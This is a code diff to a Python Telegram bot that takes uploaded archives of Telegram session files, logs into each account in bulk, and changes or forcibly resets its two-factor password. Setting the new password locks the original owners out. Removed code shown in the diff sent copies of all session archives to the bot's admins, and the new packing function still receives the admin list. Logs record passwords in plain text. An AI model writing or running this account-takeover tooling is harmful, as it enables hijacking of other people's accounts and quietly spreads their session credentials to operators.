@@ -17,7 +17,10 @@ from opentele.tl import TelegramClient
 from opentele.api import API
 from opentele.td import TDesktop
 from telethon.errors import SessionPasswordNeededError, FloodWaitError
+from telethon.tl.functions.account import GetPasswordRequest, ResetPasswordRequest
 from i18n import tr, lang_from_update, get_env_i18n
+from task_engine import (BatchTask, pack_and_send, classify_rpc_error, sanitize_filename_part,
+                         ERR_UNKNOWN, ERR_DEAD, ERR_2FA_RESET_FAIL, ERR_2FA_NO_OLD)
 
 load_dotenv()
 logger = logging.getLogger(__name__)
@@ -343,7 +346,8 @@ async def handle_2fa_document(update: Update, context: ContextTypes.DEFAULT_TYPE
             parse_mode='HTML'
         )
 
-        await process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa)
+        zip_base = os.path.splitext(document.file_name)[0]
+        await process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa, zip_base=zip_base)
 
         try:
             os.remove(zip_path)
@@ -553,20 +557,58 @@ async def generate_json_for_session(session_file, client, me, api_id, api_hash, 
 
 async def reset_2fa(client, phone):
     try:
-        await client.edit_2fa(new_password=None)
-        return True, "重置成功"
+        result = await client(ResetPasswordRequest())
     except Exception as e:
-        return False, f"重置失败: {str(e)[:50]}"
+        return False, f"重置失败: {str(e)[:60]}", e
+
+    kind = type(result).__name__
+    if kind == "ResetPasswordOk":
+        return True, "重置成功，2FA已移除", None
+
+    until = getattr(result, "until_date", None) or getattr(result, "retry_date", None)
+    if until is not None:
+        try:
+            days = max(1, int((until.timestamp() - time.time() + 86399) // 86400))
+            when = until.strftime('%Y-%m-%d %H:%M')
+        except Exception:
+            days, when = 7, str(until)
+        if kind == "ResetPasswordFailedWait":
+            return False, f"重置冷却中，最早 {when}（约{days}天）后可再试", None
+        return False, f"已发起重置，需等待约{days}天（至 {when}）", None
+    return False, f"重置未完成: {kind}", None
+
+async def set_2fa_without_old(client, new_2fa):
+    try:
+        pwd = await client(GetPasswordRequest())
+    except Exception as e:
+        return "failed", f"读取2FA状态失败: {str(e)[:50]}", classify_rpc_error(e), None
+
+    if not getattr(pwd, "has_password", False):
+        try:
+            await client.edit_2fa(new_password=new_2fa)
+            return "success", "2FA已设置", None, new_2fa
+        except Exception as e:
+            return "failed", f"设置失败: {str(e)[:50]}", classify_rpc_error(e), None
+
+    ok, msg, exc = await reset_2fa(client, None)
+    if ok:
+        try:
+            await client.edit_2fa(new_password=new_2fa)
+            return "reset_success", "2FA已重置并设置新密码", None, new_2fa
+        except Exception as e:
+            return "reset_success", f"2FA已重置，新密码设置失败: {str(e)[:50]}", classify_rpc_error(e), None
+    label = classify_rpc_error(exc) if exc is not None else ERR_2FA_NO_OLD
+    return "reset_failed", msg, label, None
 
 async def change_2fa(client, old_password, new_password):
     try:
         await client.edit_2fa(current_password=old_password, new_password=new_password)
-        return True, "修改成功"
+        return True, "修改成功", None
     except Exception as e:
         error_str = str(e).lower()
         if "invalid password" in error_str or "password invalid" in error_str:
-            return False, "旧密码错误"
-        return False, f"修改失败: {str(e)}"
+            return False, "旧密码错误", e
+        return False, f"修改失败: {str(e)}", e
 
 async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=None, new_2fa=None, mode="auto", tdata_dir=None):
     start_time = time.time()
@@ -588,6 +630,7 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
         "session": os.path.basename(session_file),
         "status": "unknown",
         "message": "",
+        "error_label": ERR_UNKNOWN,
         "original_2fa": None,
         "new_2fa_set": None,
         "json_path": None,
@@ -695,14 +738,17 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
                         logger.error(f"自动修复失败，无法使用该 session: {use_session}")
                         result["status"] = "failed"
                         result["message"] = "Session文件损坏且修复失败"
+                        result["error_label"] = ERR_UNKNOWN
                         return result
                 else:
                     result["status"] = "failed"
                     result["message"] = f"创建客户端失败: {err_msg[:30]}"
+                    result["error_label"] = ERR_UNKNOWN
                     return result
             except Exception as ex:
                 result["status"] = "failed"
                 result["message"] = f"创建客户端异常: {str(ex)[:30]}"
+                result["error_label"] = ERR_UNKNOWN
                 return result
         
         connect_start = time.time()
@@ -713,6 +759,7 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
         if not await asyncio.wait_for(client.is_user_authorized(), timeout=10):
             result["status"] = "failed"
             result["message"] = "session无效"
+            result["error_label"] = ERR_DEAD
             return result
         log_time(f"授权检查耗时: {time.time() - auth_start:.2f}秒")
         
@@ -721,6 +768,7 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
         if not me:
             result["status"] = "failed"
             result["message"] = "无法获取用户信息"
+            result["error_label"] = ERR_DEAD
             return result
         log_time(f"获取用户信息耗时: {time.time() - me_start:.2f}秒")
         
@@ -741,7 +789,7 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
             log_time(f"自动识别模式，旧密码值: {old if old else 'None'}")
             if old:
                 log_time(f"尝试修改2FA: 旧密码={old}, 新密码={new_2fa}")
-                success, msg = await change_2fa(client, old, new_2fa)
+                success, msg, chg_exc = await change_2fa(client, old, new_2fa)
                 if success:
                     result["status"] = "success"
                     result["message"] = f"2FA已修改"
@@ -750,7 +798,7 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
                 else:
                     if "旧密码错误" in msg:
                         log_time(f"旧密码错误，尝试重置2FA")
-                        reset_success, reset_msg = await reset_2fa(client, me.phone)
+                        reset_success, reset_msg, reset_exc = await reset_2fa(client, me.phone)
                         if reset_success:
                             result["status"] = "reset_success"
                             result["message"] = "旧密码错误，已重置"
@@ -759,28 +807,26 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
                         else:
                             result["status"] = "reset_failed"
                             result["message"] = "旧密码错误，重置失败"
+                            result["error_label"] = classify_rpc_error(reset_exc) if reset_exc is not None else ERR_2FA_RESET_FAIL
                             log_time(f"重置失败: {reset_msg}")
                     else:
                         result["status"] = "failed"
                         result["message"] = msg
+                        result["error_label"] = classify_rpc_error(chg_exc) if chg_exc is not None else ERR_UNKNOWN
                         log_time(f"修改失败: {msg}")
             else:
-                log_time(f"未检测到旧密码，尝试直接设置新2FA: {new_2fa}")
-                try:
-                    await client.edit_2fa(new_password=new_2fa)
-                    result["status"] = "success"
-                    result["message"] = "2FA已设置"
-                    result["new_2fa_set"] = new_2fa
-                    log_time(f"设置成功")
-                except Exception as e:
-                    result["status"] = "failed"
-                    result["message"] = f"设置失败: {str(e)[:50]}"
-                    log_time(f"设置失败: {e}")
+                log_time(f"未检测到旧密码，检查账号 2FA 状态")
+                status, msg, label, new_set = await set_2fa_without_old(client, new_2fa)
+                result["status"] = status
+                result["message"] = msg
+                result["error_label"] = label
+                result["new_2fa_set"] = new_set
+                log_time(f"{status}: {msg}")
         
         else:
             log_time(f"手动输入模式，使用用户提供的旧密码: {old_2fa if old_2fa else 'None'}")
             if old_2fa:
-                success, msg = await change_2fa(client, old_2fa, new_2fa)
+                success, msg, chg_exc = await change_2fa(client, old_2fa, new_2fa)
                 if success:
                     result["status"] = "success"
                     result["message"] = f"2FA已修改"
@@ -788,7 +834,7 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
                     log_time(f"修改成功")
                 else:
                     if "旧密码错误" in msg:
-                        reset_success, reset_msg = await reset_2fa(client, me.phone)
+                        reset_success, reset_msg, reset_exc = await reset_2fa(client, me.phone)
                         if reset_success:
                             result["status"] = "reset_success"
                             result["message"] = "旧密码错误，已重置"
@@ -797,23 +843,21 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
                         else:
                             result["status"] = "reset_failed"
                             result["message"] = "旧密码错误，重置失败"
+                            result["error_label"] = classify_rpc_error(reset_exc) if reset_exc is not None else ERR_2FA_RESET_FAIL
                             log_time(f"重置失败: {reset_msg}")
                     else:
                         result["status"] = "failed"
                         result["message"] = msg
+                        result["error_label"] = classify_rpc_error(chg_exc) if chg_exc is not None else ERR_UNKNOWN
                         log_time(f"修改失败: {msg}")
             else:
-                log_time(f"无旧密码，尝试直接设置新2FA: {new_2fa}")
-                try:
-                    await client.edit_2fa(new_password=new_2fa)
-                    result["status"] = "success"
-                    result["message"] = "2FA已设置"
-                    result["new_2fa_set"] = new_2fa
-                    log_time(f"设置成功")
-                except Exception as e:
-                    result["status"] = "failed"
-                    result["message"] = f"设置失败: {str(e)[:50]}"
-                    log_time(f"设置失败: {e}")
+                log_time(f"无旧密码，检查账号 2FA 状态")
+                status, msg, label, new_set = await set_2fa_without_old(client, new_2fa)
+                result["status"] = status
+                result["message"] = msg
+                result["error_label"] = label
+                result["new_2fa_set"] = new_set
+                log_time(f"{status}: {msg}")
         
         total_time = time.time() - start_time
         log_time(f"账号 {os.path.basename(session_file)} 2FA处理完成，状态={result['status']}，总耗时={total_time:.2f}秒")
@@ -821,18 +865,22 @@ async def check_session_2fa(session_file, json_file, api_id, api_hash, old_2fa=N
     except SessionPasswordNeededError:
         result["status"] = "failed"
         result["message"] = "需要2FA验证"
+        result["error_label"] = ERR_2FA_RESET_FAIL
         log_time("需要2FA验证")
     except FloodWaitError as e:
         result["status"] = "failed"
         result["message"] = f"等待{e.seconds}秒"
+        result["error_label"] = classify_rpc_error(e)
         log_time(f"Flood wait {e.seconds}秒")
     except asyncio.TimeoutError:
         result["status"] = "failed"
         result["message"] = "网络操作超时"
+        result["error_label"] = ERR_UNKNOWN
         log_time("网络操作超时")
     except Exception as e:
         result["status"] = "failed"
         result["message"] = f"错误: {str(e)[:30]}"
+        result["error_label"] = classify_rpc_error(e)
         log_time(f"异常: {e}")
     finally:
         if client:
@@ -855,7 +903,7 @@ def get_total_size(path):
                 total += os.path.getsize(fp)
     return total
 
-async def process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa):
+async def process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa, zip_base=None):
     lang = lang_from_update(update)
     api_id_str = os.getenv("TELEGRAM_APP_ID")
     api_hash = os.getenv("TELEGRAM_APP_HASH")
@@ -889,7 +937,7 @@ async def process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa
 
     try:
         await asyncio.wait_for(
-            _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa),
+            _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa, zip_base),
             timeout=MAX_TASK_TIME
         )
     except asyncio.TimeoutError:
@@ -903,7 +951,7 @@ async def process_2fa(update, context, zip_path, user_id, mode, old_2fa, new_2fa
             reply_markup=reply_markup
         )
 
-async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa):
+async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_hash, admins, mode, old_2fa, new_2fa, zip_base=None):
     lang = lang_from_update(update)
     with tempfile.TemporaryDirectory() as temp_dir:
         extract_dir = os.path.join(temp_dir, "extracted")
@@ -1027,14 +1075,12 @@ async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_
         )
 
         success_dir = os.path.join(temp_dir, "success")
-        reset_success_dir = os.path.join(temp_dir, "reset_success")
-        reset_failed_dir = os.path.join(temp_dir, "reset_failed")
         failed_dir = os.path.join(temp_dir, "failed")
 
         os.makedirs(success_dir, exist_ok=True)
-        os.makedirs(reset_success_dir, exist_ok=True)
-        os.makedirs(reset_failed_dir, exist_ok=True)
         os.makedirs(failed_dir, exist_ok=True)
+
+        task = BatchTask(user_id, update.effective_chat.id, [], "2fa")
 
         success_count = 0
         reset_success_count = 0
@@ -1062,18 +1108,21 @@ async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_
             )
             results.append(result)
 
-            if result["status"] == "success":
+            if result["status"] in ("success", "reset_success"):
                 target_dir = success_dir
-                success_count += 1
-            elif result["status"] == "reset_success":
-                target_dir = reset_success_dir
-                reset_success_count += 1
-            elif result["status"] == "reset_failed":
-                target_dir = reset_failed_dir
-                reset_failed_count += 1
+                if result["status"] == "success":
+                    success_count += 1
+                else:
+                    reset_success_count += 1
+                task.record_done({"category": "success"})
             else:
-                target_dir = failed_dir
-                failed_count += 1
+                if result["status"] == "reset_failed":
+                    reset_failed_count += 1
+                else:
+                    failed_count += 1
+                label = result.get("error_label") or ERR_UNKNOWN
+                target_dir = os.path.join(failed_dir, sanitize_filename_part(label))
+                task.record_done({"category": "fail", "error": label})
 
             account_folder = os.path.join(target_dir, phone)
             os.makedirs(account_folder, exist_ok=True)
@@ -1112,45 +1161,8 @@ async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_
 
             await asyncio.sleep(0.1)
 
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-
-        success_zip = os.path.join(temp_dir, "success.zip")
-        if success_count > 0:
-            with zipfile.ZipFile(success_zip, 'w') as zipf:
-                for root, dirs, files in os.walk(success_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arcname = os.path.relpath(file_path, success_dir)
-                        zipf.write(file_path, arcname)
-
-        reset_success_zip = os.path.join(temp_dir, "reset_success.zip")
-        if reset_success_count > 0:
-            with zipfile.ZipFile(reset_success_zip, 'w') as zipf:
-                for root, dirs, files in os.walk(reset_success_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arcname = os.path.relpath(file_path, reset_success_dir)
-                        zipf.write(file_path, arcname)
-
-        reset_failed_zip = os.path.join(temp_dir, "reset_failed.zip")
-        if reset_failed_count > 0:
-            with zipfile.ZipFile(reset_failed_zip, 'w') as zipf:
-                for root, dirs, files in os.walk(reset_failed_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arcname = os.path.relpath(file_path, reset_failed_dir)
-                        zipf.write(file_path, arcname)
-
-        failed_zip = os.path.join(temp_dir, "failed.zip")
-        if failed_count > 0:
-            with zipfile.ZipFile(failed_zip, 'w') as zipf:
-                for root, dirs, files in os.walk(failed_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arcname = os.path.relpath(file_path, failed_dir)
-                        zipf.write(file_path, arcname)
-
-        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>{tr('2fa.done', lang)}</b>
+        def result_text_fn(cats, pending):
+            return f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>{tr('2fa.done', lang)}</b>
 
 <tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> {tr('2fa.stats', lang)}:
 • <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> {tr('2fa.total', lang)}: <b>{len(accounts)}</b>
@@ -1159,107 +1171,15 @@ async def _process_2fa_internal(update, context, zip_path, user_id, api_id, api_
 • <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji> {tr('2fa.reset_failed', lang)}: <b>{reset_failed_count}</b>
 • <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> {tr('2fa.failed', lang)}: <b>{failed_count}</b>"""
 
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=result_text,
-            parse_mode='HTML'
+        await pack_and_send(
+            context, update, task,
+            categories={
+                "success": (success_dir, None, lambda n: f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> {tr('2fa.success_caption', lang)} ({n})</b>"),
+                "fail": (failed_dir, None, lambda n: f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> {tr('2fa.failed', lang)} ({n})</b>"),
+            },
+            admins=admins, lang=lang, result_text_fn=result_text_fn,
+            zip_base=zip_base or f"2fa_{user_id}"
         )
-
-        if success_count > 0:
-            with open(success_zip, 'rb') as f:
-                await context.bot.send_document(
-                    chat_id=update.effective_chat.id,
-                    document=f,
-                    filename=f"success_{timestamp}.zip",
-                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> {tr('2fa.success_caption', lang)} ({success_count})</b>",
-                    parse_mode='HTML'
-                )
-
-        if reset_success_count > 0:
-            with open(reset_success_zip, 'rb') as f:
-                await context.bot.send_document(
-                    chat_id=update.effective_chat.id,
-                    document=f,
-                    filename=f"reset_success_{timestamp}.zip",
-                    caption=f"<b><tg-emoji emoji-id='5922612721244704425'>♻️</tg-emoji> {tr('2fa.reset_success', lang)} ({reset_success_count})</b>",
-                    parse_mode='HTML'
-                )
-
-        if reset_failed_count > 0:
-            with open(reset_failed_zip, 'rb') as f:
-                await context.bot.send_document(
-                    chat_id=update.effective_chat.id,
-                    document=f,
-                    filename=f"reset_failed_{timestamp}.zip",
-                    caption=f"<b><tg-emoji emoji-id='5846008814129649022'>⚠️</tg-emoji> {tr('2fa.reset_failed', lang)} ({reset_failed_count})</b>",
-                    parse_mode='HTML'
-                )
-
-        if failed_count > 0:
-            with open(failed_zip, 'rb') as f:
-                await context.bot.send_document(
-                    chat_id=update.effective_chat.id,
-                    document=f,
-                    filename=f"failed_{timestamp}.zip",
-                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> {tr('2fa.failed', lang)} ({failed_count})</b>",
-                    parse_mode='HTML'
-                )
-
-        for admin_id in admins:
-            admin_id = admin_id.strip()
-            if not admin_id:
-                continue
-
-            try:
-                await context.bot.send_message(
-                    chat_id=admin_id,
-                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>{tr('2fa.task_done', lang)}</b>
-
-<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> {tr('admin.user', lang)}: <code>{user_id}</code>
-{tr('2fa.mode', lang)}: {tr('2fa.auto_mode', lang) if mode == 'auto' else tr('2fa.manual_mode', lang)}
-<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> {tr('2fa.total', lang)}: <b>{len(accounts)}</b>
-• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> {tr('2fa.success_change', lang)}: <b>{success_count}</b>
-• <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji> {tr('2fa.reset_success', lang)}: <b>{reset_success_count}</b>
-• <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji> {tr('2fa.reset_failed', lang)}: <b>{reset_failed_count}</b>
-• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> {tr('2fa.failed', lang)}: <b>{failed_count}</b>""",
-                    parse_mode='HTML'
-                )
-                
-                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                
-                if success_count > 0:
-                    with open(success_zip, 'rb') as f:
-                        await context.bot.send_document(
-                            chat_id=admin_id,
-                            document=f,
-                            filename=f"success_{user_id}_{admin_timestamp}.zip"
-                        )
-                
-                if reset_success_count > 0:
-                    with open(reset_success_zip, 'rb') as f:
-                        await context.bot.send_document(
-                            chat_id=admin_id,
-                            document=f,
-                            filename=f"reset_success_{user_id}_{admin_timestamp}.zip"
-                        )
-                
-                if reset_failed_count > 0:
-                    with open(reset_failed_zip, 'rb') as f:
-                        await context.bot.send_document(
-                            chat_id=admin_id,
-                            document=f,
-                            filename=f"reset_failed_{user_id}_{admin_timestamp}.zip"
-                        )
-                
-                if failed_count > 0:
-                    with open(failed_zip, 'rb') as f:
-                        await context.bot.send_document(
-                            chat_id=admin_id,
-                            document=f,
-                            filename=f"failed_{user_id}_{admin_timestamp}.zip"
-                        )
-            except Exception as e:
-                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
         
         try:
             await status_msg.delete()
